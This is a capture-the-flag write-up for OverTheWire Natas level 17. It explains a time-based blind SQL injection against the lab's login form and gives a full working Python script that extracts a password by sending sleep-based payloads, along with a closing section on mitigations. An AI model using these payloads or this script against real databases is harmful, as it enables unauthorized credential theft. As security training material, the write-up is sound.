# Natas Level 17 — Writeup

**Challenge:** [OverTheWire Natas Wargame](http://natas.labs.overthewire.org/)
**Level:** natas16 → natas17
**Category:** Blind SQL Injection (Time-Based)

## Objective

Find the password for `natas18` using only the `natas17` login form, without any visible error messages or output difference, meaning this is a **blind** SQL injection.


## Recon

Visiting the Natas17 login page shows a simple username/password form. Checking the page source (or comparing with Natas16, its predecessor) reveals the backend query looks something like:

```sql
SELECT * FROM users WHERE username="$username" AND password="$password"
```

Unlike previous levels, **this page shows no output at all**, no error messages, no "Wrong password" text, no login confirmation. This rules out classic error-based or boolean-based (content-diff) blind SQLi.

Since there's no visible signal in the response, the only usable side-channel is **response time** this points to a **time-based blind SQL injection**.


## Approach

The idea: inject a conditional `IF(...)` statement into the SQL query using `sleep(N)`. If the condition is true, the query pauses for `N` seconds before responding. By measuring response time, we can infer **true/false** answers about the database — one character at a time.

### Payload structure

```sql
username=natas18" AND IF(BINARY substring(password,1,N)='guess', sleep(5), 0) -- 
```

- `substring(password,1,N)` grabs the first `N` characters of the password.
- `BINARY` forces a case-sensitive comparison (the password is alphanumeric, mixed case).
- If our guessed prefix matches, the query sleeps → slow response = **match**.
- If not, the query returns instantly → fast response = **no match**.

We brute-force this character by character, across the character set `[a-zA-Z0-9]` (previous Natas passwords are 32-char alphanumeric strings).


## Problems Encountered

A naive implementation runs into false positives/negatives because:

1. **Network/server jitter** — the shared Natas server has variable latency, so a "fast" request can occasionally take longer than expected, and get misread as a match.
2. **No confirmation step** — a single slow response isn't reliable proof; it needs to be repeated.
3. **Missing `break`** — after finding a matching character, the loop must stop trying the rest of the charset for that position, or it may overwrite a correct guess with a bad one.

### Fix: Baseline calibration + majority voting

To make the timing side-channel reliable:

- **Calibrate a baseline** first, by sending a guaranteed-false condition (`IF(1=2, sleep(5), 0)`) and measuring normal response time.
- Set the detection **threshold** above that baseline.
- Require a character to register as "slow" **multiple times** (majority vote) before accepting it, and reject early if it fails twice.

---

## Final Script

```python
import requests
import string
import time
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas17', 'natas17_password')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

u = "http://natas17.natas.labs.overthewire.org/index.php?debug"

password = ""
count = 1
PASSWORD_LENGTH = 32
VALID_CHARS = string.digits + string.ascii_letters

SLEEP_TIME = 5
VOTES_NEEDED = 3
MAX_ROUNDS_PER_CHAR = 5

def measure(payload):
    try:
        r = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False, timeout=15)
        return r.elapsed.total_seconds()
    except requests.exceptions.RequestException as e:
        print("  request error:", e)
        return 0

def get_baseline():
    payload = "username=natas18\" AND IF(1=2, sleep(%d), 0) -- " % SLEEP_TIME
    times = [measure(payload) for _ in range(3)]
    return max(times)

print("Calibrating baseline...")
baseline = get_baseline()
threshold = max(baseline + 1.5, SLEEP_TIME * 0.5)
print(f"Baseline latency: {baseline:.2f}s, threshold set to: {threshold:.2f}s")

def try_char(password, count, c):
    payload = ("username=natas18\" AND "
               f"IF(BINARY substring(password,1,{count})='{password}{c}', sleep({SLEEP_TIME}), 0)"
               " -- ")
    votes = 0
    checks = 0
    while checks < VOTES_NEEDED + 1:
        elapsed = measure(payload)
        checks += 1
        if elapsed > threshold:
            votes += 1
        if votes >= VOTES_NEEDED:
            return True
        if checks - votes >= 2:
            return False
    return votes >= VOTES_NEEDED

def try_position(password, count):
    for c in VALID_CHARS:
        if try_char(password, count, c):
            return c
    return None

while count <= PASSWORD_LENGTH:
    found_char = None
    for attempt in range(1, MAX_ROUNDS_PER_CHAR + 1):
        found_char = try_position(password, count)
        if found_char:
            break
        print(f"  Position {count}: round {attempt} failed, retrying...")
        time.sleep(1)

    if found_char:
        password += found_char
        count += 1
        print("Found one more char : %s" % password)
    else:
        print("No character matched at position %d after %d rounds. Stopping." % (count, MAX_ROUNDS_PER_CHAR))
        break

print("Done! Final password:", password)
```

## Result

Running the script against `natas17` successfully extracted the 32-character `natas18` password one character at a time via timing side-channel, which was then used to log in as `natas18`.


## Key Takeaways

- **Blind SQLi doesn't always mean boolean-based** — when there's no visible content difference, response timing is a valid alternative side-channel.
- **Timing attacks are noisy in the real world.** A script that works in theory needs baseline calibration and repeated confirmation to be reliable against real network conditions.
- **`BINARY` keyword matters** for case-sensitive string comparisons in MySQL, without it, `substring` comparisons default to case-insensitive collation, which can produce false positives.
- Always **break out of the inner loop** immediately after a confirmed match continuing to test other characters at the same position risks corrupting already-correct data.


## Mitigation (Defensive Takeaway)

This vulnerability exists because user input is concatenated directly into a SQL query. The fix, as always with SQL injection:

- Use **parameterized queries / prepared statements** instead of string concatenation.
- Never trust the timing of a response either even parameterized apps should avoid exposing conditional logic driven directly by untrusted input.


*Writeup for educational purposes as part of the OverTheWire Natas wargame series.*